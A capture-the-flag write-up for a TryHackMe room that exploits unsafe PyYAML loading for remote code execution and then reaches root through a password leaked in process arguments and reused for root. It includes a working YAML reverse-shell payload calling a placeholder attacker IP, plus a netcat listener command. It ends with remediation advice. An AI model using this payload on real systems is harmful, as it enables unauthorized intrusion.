
# [Writeup] TryHackMe - Hacker Holidays 2026: Day 5 - Beach Bar

**Category:** Boot2Root / Web Exploitation / Privilege Escalation
**Difficulty:** Easy
**Keywords:** PyYAML, Insecure Deserialization, Remote Code Execution (RCE), Process Sniffing, Command Line Leakage, Password Reuse, PrivEsc

---

## 1. Executive Summary
The **Beach Bar** challenge on TryHackMe demonstrates two severe vulnerabilities commonly found in poorly configured modern environments: **Insecure Deserialization** via unsafe configuration file parsing and **Local Privilege Escalation (LPE)** via process credential leaking combined with password reuse.

An attacker can upload a maliciously crafted YAML configuration file to achieve arbitrary Remote Code Execution (RCE) as a low-privileged user (`bartender`). From there, the attacker can sniff sensitive variables out of running service parameters to escalate privileges directly to `root`.

---

## 2. Initial Access: YAML Insecure Deserialization (RCE)

### Vulnerability Analysis
The target web application features an option to upload a custom jukebox playlist file in the `.yml` (YAML) format. Security auditing reveals that the back-end application relies on an outdated version of the **PyYAML** library for Python.

When parsing user-supplied configuration documents, the application utilizes the unsafe `yaml.load()` method instead of the secure `yaml.safe_load()`. This structural flaw permits an attacker to inject serialized object constructors (such as Python's `subprocess.Popen` or `os.system`), which the Python interpreter instantiates and executes instantly upon processing the file.

### Exploitation Setup
To intercept the incoming reverse shell connection from the web server, we open a local network port on our attack terminal machine using Netcat:

```bash
nc -lvnp 9001
```

### Payload Drafting
We generate a text document named `playlist.yml`. Instead of standard track metadata, we populate the document structure with an explicit Python system execution constructor targeting the host's bash environment:

```yaml
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/YOUR_THM_VPN_IP/9001 0>&1'"]
```

### Execution
We upload the malicious `playlist.yml` file via the DJ Jukebox web panel interface. The remote server attempts to deserialize the incoming document, instantly processes the `os.system` object application block, initiates the bash interactive runtime hook, and establishes a connection back to our listener.

**Resulting shell access level:** `bartender@tryhackme-2404`

---

## 3. Privilege Escalation: Command Line Info Disclosure

### Local Reconnaissance
Upon stabilizing the interactive terminal session, a directory listing of the host's `/opt/` path reveals the primary application source tree located at `/opt/beach-bar/jukeboxd/`.

Reviewing the main python driver file `jukeboxd.py` via `cat` indicates that it accepts a mandatory command-line parameter flag when launched:

```python
parser.add_argument("--stream-pass", required=True, help="stream backend password")
```

### Exploit Vector
In Linux operating systems, operational command-line string arguments assigned to running processes are stored dynamically and remain accessible globally via the `/proc` virtual interface and standard process inventory utilities like `ps`. Because the `jukebox` service runs permanently as a background daemon, any local system identity can check its active startup configurations.

We execute a process inspection pass looking for the target daemon:

```bash
ps aux | grep jukeboxd
```

### Response Output:
The command reveals the full active daemon invocation string, leaking the plaintext password argument:

```text
python3 jukeboxd.py --stream-pass SunsetSpritz2024!
```

### Password Reuse Abuse (Root Capture)
The administrator profile deployment architecture reused the exact same hardcoded password string (`SunsetSpritz2024!`) across multiple system service layers, including the local `root` account.

We execute the standard user profile swap command to elevate privileges:

```bash
su - root
```

When prompted for authorization, we enter the leaked credential: `SunsetSpritz2024!`. The system instantly authenticates the swap, granting us full root console authorization.

---

## 4. Flag Recovery
We navigate directly into the system root home partition and extract the target victory parameter:

```bash
cd /root
cat root.txt
```

### Captured Flag:
```text
THM{***}
```

---

## 5. Remediation Strategies
* **Implement Safe Deserialization:** Never use `yaml.load()` on untrusted input data. Always restrict YAML compilation handlers to the secure parsing structure `yaml.safe_load()`.
* **Sanitize Process Arguments:** Avoid passing sensitive tokens, private keys, or system passwords as plain text arguments within active shell execution flags. Store sensitive operational parameters in secure, restricted environment variables or fetch them dynamically from encrypted storage layers.
* **Enforce Password Isolation:** Ban password reuse policies across internal environments. Administrative root identities must maintain isolated, unique, and long-entropy passwords completely un-linked from application-level execution variables.
